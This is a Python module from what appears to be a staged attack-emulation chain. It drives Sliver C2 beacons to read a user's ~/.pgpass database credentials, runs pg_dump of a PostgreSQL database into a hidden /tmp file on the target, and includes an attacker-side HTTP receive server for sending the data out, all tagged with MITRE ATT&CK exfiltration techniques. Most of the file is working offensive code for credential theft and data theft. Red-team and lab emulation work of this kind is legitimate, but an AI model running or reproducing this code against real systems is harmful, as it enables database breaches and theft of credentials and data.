import os
import re
import time
import subprocess
import threading

from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# advanced_exfiltration.py — Advanced DB Exfiltration
# MITRE ATT&CK:
#   TA0010 - Exfiltration
#   T1041  - Exfiltration Over C2 Channel
#   T1567  - Exfiltration Over Web Service (simulated via C2 download)
# =============================================================================

PGPASS_PATH = "/home/vinzenz.fedora/.pgpass"
DB_HOST = "10.30.0.6"
DUMP_REMOTE_PATH = "/tmp/.sys_backup.gz"
EXFIL_HTTP_PORT = 9443                       # Kali-side HTTP receive port
KALI_IP = "10.10.0.2"


# ---------------------------------------------------------------------------
# Helpers: beacon task polling
# ---------------------------------------------------------------------------

def _beacon_task_wait(beacon_id: str, task_id: str, *,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Poll `tasks fetch <id>` until ✅ Completed, return the output section."""
    for i in range(max_polls):
        time.sleep(interval)
        fetch_out = sliver_exec(beacon_id, f"tasks fetch {task_id}", timeout=30)
        if "✅ Completed" in fetch_out:
            if "[*] Output:" in fetch_out:
                return fetch_out.split("[*] Output:", 1)[1].strip()
            return fetch_out
    return None


def _beacon_exec_wait(beacon_id: str, command: str, *,
                      cmd_timeout: int = 120,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Submit a beacon command and wait for its task to finish.

    Returns the task output or None on failure.
    """
    output = sliver_exec(beacon_id, command, timeout=cmd_timeout)
    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", output)
    if not m:
        log(f"[-] No task ID found. Output: {output.strip()}")
        return None
    task_id = m.group(1)
    log(f"[*] Beacon task {task_id} submitted. Polling for completion …")
    return _beacon_task_wait(beacon_id, task_id,
                             max_polls=max_polls, interval=interval)


# ---------------------------------------------------------------------------
# Kali-side one-shot HTTP receive server (runs in a background thread)
# ---------------------------------------------------------------------------

def _start_receive_server(port: int, output_path: str):
    """One-shot HTTP server: accepts a single POST, saves the body, then exits."""
    script = (
        f"import http.server\n"
        f"class H(http.server.BaseHTTPRequestHandler):\n"
        f"    def do_POST(self):\n"
        f"        n=int(self.headers['Content-Length'])\n"
        f"        with open('{output_path}','wb') as fh: fh.write(self.rfile.read(n))\n"
        f"        self.send_response(200);self.end_headers()\n"
        f"    def log_message(self,*a):pass\n"
        f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
    )
    proc = subprocess.Popen(
        ["python3", "-c", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    if proc.poll() is not None:
        raise RuntimeError(f"Receive server exited immediately — port {port} busy?")
    log(f"[+] HTTP receive server listening on 0.0.0.0:{port}")
    return proc


def _stop_receive_server(proc):
    if proc and proc.poll() is None:
        proc.terminate()


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
    """Read ~/.pgpass from vinzenz_ws via the beacon."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} …")
    result = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- cat {PGPASS_PATH}",
        max_polls=15, interval=5,
    )
    if result is None:
        log("[-] Task did not complete or returned no output.")
        return None

    for line in result.splitlines():
        line = line.strip()
        # Skip Sliver table formatting lines
        if (not line or line.startswith("#") or
            any(kw in line for kw in (
                "Task", "State", "Description", "Created", "Sent",
                "Completed", "Request Size", "Response Size",
                "+-", "| ", "[*]"))):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}

    log(f"[-] No usable credential found in .pgpass")
    return None


def _dump_compress_and_exfil(vinzenz_beacon: str, creds: dict,
                              results_dir: str) -> bool:
    """Dump the DB and compress it locally on the target.

    Strategy:
      1. Beacon task: pg_dump | gzip > /tmp/.sys_backup.gz
      2. Leave the file on the target for the next phase (no exfiltration over C2).
    """
    # ── Step 1: Dump the database ────────────────────────────────────────────
    dump_cmd = (
        f"PGPASSWORD='{creds['password']}' "
        f"pg_dump -h {DB_HOST} -p {creds['port']} "
        f"-U {creds['user']} -d {creds['dbname']} -a -T auth_tokens "
        f"| gzip > {DUMP_REMOTE_PATH}"
    )
    log(f"[*] Dumping DB '{creds['dbname']}' from {DB_HOST} "
        f"and compressing to {DUMP_REMOTE_PATH} …")

    # Execute synchronously in the beacon
    sliver_exec(
        vinzenz_beacon,
        f'execute -o -- sh -c "{dump_cmd}"',
        timeout=120
    )
    log(f"[+] Database dump command completed.")

    # Brief wait to ensure file is flushed to disk
    time.sleep(3)

    # ── Step 2: Verify dump file exists ──────────────────────────────────────
    verify_result = sliver_exec(
        vinzenz_beacon,
        f"execute -o -- ls -la {DUMP_REMOTE_PATH}",
        timeout=30
    )
    if verify_result and DUMP_REMOTE_PATH in verify_result:
        log(f"[+] Dump file verified on target at {DUMP_REMOTE_PATH}.")
        return True
    else:
        log(f"[-] Could not verify dump file on target.")
        return False


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
    """Execute Phase 8: Data Exfiltration via the workstation beacon."""
    log("\n[*] Starting Advanced Data Exfiltration (Phase 8) …")

    if not vinzenz_beacon:
        log("[-] No active vinzenz beacon provided. Cannot proceed.")
        return {"exfil_success": False}

    # 1. Credential discovery -------------------------------------------------
    creds = _discover_db_creds(vinzenz_beacon)
    if not creds:
        return {"exfil_success": False}

    # Enforce known DB host (dynamic recon will be added later)
    creds["host"] = DB_HOST

    # 2. Dump + compress (leave on target) ------------------------------------
    exfil_ok = _dump_compress_and_exfil(vinzenz_beacon, creds, results_dir)

    # 3. Cleanup skipped ------------------------------------------------------
    # We leave the file on the target as requested by the user.

    if exfil_ok:
        log("[+] Phase 8: Advanced Data Exfiltration completed successfully.")
    else:
        log("[-] Phase 8: Advanced Data Exfiltration failed.")

    return {"exfil_success": exfil_ok}


if __name__ == "__main__":
    pass
